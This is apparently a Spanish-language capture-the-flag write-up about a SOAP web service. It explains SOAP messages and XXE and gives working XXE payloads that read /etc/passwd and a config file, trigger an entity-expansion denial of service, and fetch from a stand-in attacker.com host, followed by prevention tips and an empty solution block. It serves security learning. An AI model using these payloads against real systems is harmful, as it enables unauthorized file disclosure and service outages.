Description The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? Additional details will be available after launching your challenge instance.

#### Descripción

El proyecto web se realizó con prisas y no se realizó ninguna evaluación de seguridad. ¿Puedes leer el archivo /etc/passwd?

Habrá detalles adicionales disponibles después de lanzar su instancia de desafío.

**SOAP** (Simple Object Access Protocol) es un protocolo de comunicación basado en XML que permite intercambiar información entre aplicaciones a través de redes. Se utiliza comúnmente en arquitecturas orientadas a servicios (SOA) y es independiente de la plataforma y el lenguaje de programación.

### Características principales:

- **Basado en XML**: El formato de los mensajes es XML, lo que facilita la interoperabilidad entre diferentes tecnologías.
    
- **Transporte independiente**: Puede utilizar varios protocolos como HTTP, SMTP, entre otros.
    
- **Seguro y confiable**: Soporta estándares de seguridad como WS-Security.
    
- **Soporta RPC**: Permite hacer llamadas remotas a funciones o procedimientos de otras aplicaciones.
    

### Estructura de un mensaje SOAP:

1. **Envelope**: Contenedor principal del mensaje.
    
2. **Header**: Información adicional (opcional).
    
3. **Body**: Contiene los datos del mensaje (obligatorio).
    
4. **Fault**: Información sobre errores (opcional).
    

### Usos comunes:

- Integración de sistemas empresariales.
    
- Servicios web seguros y confiables.
    
- Aplicaciones que requieren transacciones complejas y seguridad avanzada.
    

En resumen, SOAP es ideal para entornos donde se requiere interoperabilidad, seguridad y transacciones complejas, aunque es más pesado y formal comparado con otros protocolos como REST.

### Ejemplo de un mensaje SOAP:
```
<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://www.example.com/webservice">
   <soapenv:Header/>
   <soapenv:Body>
      <web:GetUserInfo>
         <web:UserId>12345</web:UserId>
      </web:GetUserInfo>
   </soapenv:Body>
</soapenv:Envelope>

```

#### XXE:
**XXE** (XML External Entity) es una vulnerabilidad que ocurre cuando una aplicación procesa archivos XML y no valida correctamente las entidades externas. Los atacantes pueden explotar esta vulnerabilidad para acceder a archivos locales, realizar ataques de denegación de servicio (DoS) o exfiltrar información de manera maliciosa.

### Ejemplos de **payloads** sencillos de **XXE**:

1. **Leer archivo local (como `/etc/passwd` en Linux)**:
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root>
      <data>&xxe;</data>
    </root>
    ```
    
    - Intenta leer el archivo `/etc/passwd` en sistemas Linux.
        
2. **Denegación de servicio (DoS) - Bomba de entidades**:
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
      <!ENTITY xxe "&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;">
    ]>
    <foo>
      <bar>&xxe;</bar>
    </foo>
    ```
    
    - Genera una gran expansión de entidades, agotando los recursos del sistema.
        
3. **Leer contenido remoto (desde un servidor controlado por el atacante)**:
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
      <!ENTITY xxe SYSTEM "http://attacker.com/malicious-data">
    ]>
    <root>
      <data>&xxe;</data>
    </root>
    ```
    
    - Intenta cargar un archivo desde un servidor controlado por el atacante.
        
4. **Leer archivo de configuración sensible**:
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
      <!ENTITY config SYSTEM "file:///path/to/config.xml">
    ]>
    <root>
      <data>&config;</data>
    </root>
    ```
    
    - Intenta incluir un archivo de configuración con información sensible.
        

---

### Prevención:

- Deshabilitar la resolución de entidades externas en los parsers XML.
    
- Usar parsers XML seguros que no permitan la carga de entidades externas.
    
- Validar y filtrar adecuadamente cualquier entrada de XML antes de procesarla.
![[Pasted image 20250402122258.png]]
![[Pasted image 20250402122514.png]]


## Solución 
```

```
